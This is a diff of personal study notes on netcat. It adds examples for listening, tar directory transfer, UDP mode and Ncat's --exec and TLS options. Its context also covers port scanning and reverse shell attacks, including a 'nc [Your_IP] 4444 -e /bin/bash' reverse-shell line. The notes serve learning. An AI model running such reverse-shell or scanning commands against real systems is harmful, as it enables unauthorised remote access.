@@ -1,6 +1,6 @@
                         NETCAT(nc)
                     ===============
-- is a versatile networking tool taht can be used for a variety of purposes, including:
+- Is a versatile networking tool taht can be used for a variety of purposes, including:
     >> port scanning
     >> transferring files
     >> acting as a simple server or client
@@ -14,7 +14,8 @@ Flag |   Name      | Usage
 -n   |   Numeric   |  Stops NC from trying to resolve hostnames via DNS (makes it faster).
 -w   |   Timeout   |  Stops the connection after X seconds of inactivity.
 -k   |   Keep-Open | Keeps the listener alive even after a client disconnects.
-                
+
+
                     COMMON USES     
                 ==================      
 - When conducting reverse shell attacks we do not connect to a machine we wait for the machine to connect to us.
@@ -31,21 +32,29 @@ Flag |   Name      | Usage
 			-p :- local port number.
 
 
+- Listening for incoming connections.
+    EG.
+        nc -l -p port ----> nc -l -p 1234
+            OR 
+        nc -l port ----> nc -l 1234
+            OR 
+        # to accept multiple sequential connections:
+        nc -l -k 1234 
+
+
 - connect to a remote host:
     EG. 
         nc hostname port --> nc example.com 80
 
-
-- Listening for incoming connections.
-    EG.
-        nc -l -p port ----> nc -l -p 1234
-
+            * If you type on one side; it appears on the other.
 
 - Port scanning.
     EG. [[tcp connection]]
         nc -zv hostname start_port-end_port ----> nc -zv example.com 80-100
 
             -z : tells netcat to report a connection status without sending any actual data.
+                 Not a replacement for nmap.
+            -v : Verbose shows open/closed messages.
 
     EG. [[udp connections]]
         nc -zvu hostname start_port-end_port ----> nc -zvu example.com 80-100
@@ -78,6 +87,27 @@ Flag |   Name      | Usage
 
             EG. << sending file.txt from hostname on port 12345>>
                 nc localhost 12345 < file.txt
+
+
+- Transferring a directory (using tar)
+    EG.
+        # Receiver side
+        nc -l 1234 | tar -xzf - 
+
+        # Sender 
+        tar -czf - directory | nc <receiver_ip> 1234
+
+
+- UDP mode.
+    - use -u for UDP.
+    - It is connectionless.
+    - Ordering and delivery are not guaranteed.
+        EG.
+            # send a UDP packet.
+            echo "hello" | nc -u <host> <port>
+
+            # Listen on UDP.
+            nc -u -l 5353 > udp_output.txt 
 
 
 - connect to a remote server and send data
@@ -113,4 +143,30 @@ Flag |   Name      | Usage
                 nc [Your_IP] 4444 -e /bin/bash
 
 
-- 
+- Using Ncat for safer exec and TLS 
+    - Ncat adds features like:
+        --exec : Runs a program directly (no shell).
+        --sh-exec : Runs via a shell.
+        --ssl : to encrypt the connection.
+            EG.
+            # USING --EXEC
+                # Print system uptime to whoever connects (lab only)
+                ncat -l 4444 --exec "/usr/bin/uptime"
+
+                ncat localhost 4444
+                # client sees uptime output then disconnects
+
+        # USING TLS
+            # OpenBSD nc has -c and -C TLS options 
+            # Listen with TLS (OpenBSD nc)
+            nc -l -c -C cert.pem 12345
+
+        # USING --SSL 
+            # Ncat server with SSL
+            ncat --ssl -l 4433 --exec "/usr/bin/uptime"
+
+            # Client:
+            ncat --ssl server.example.com 4433
+
+
+-  
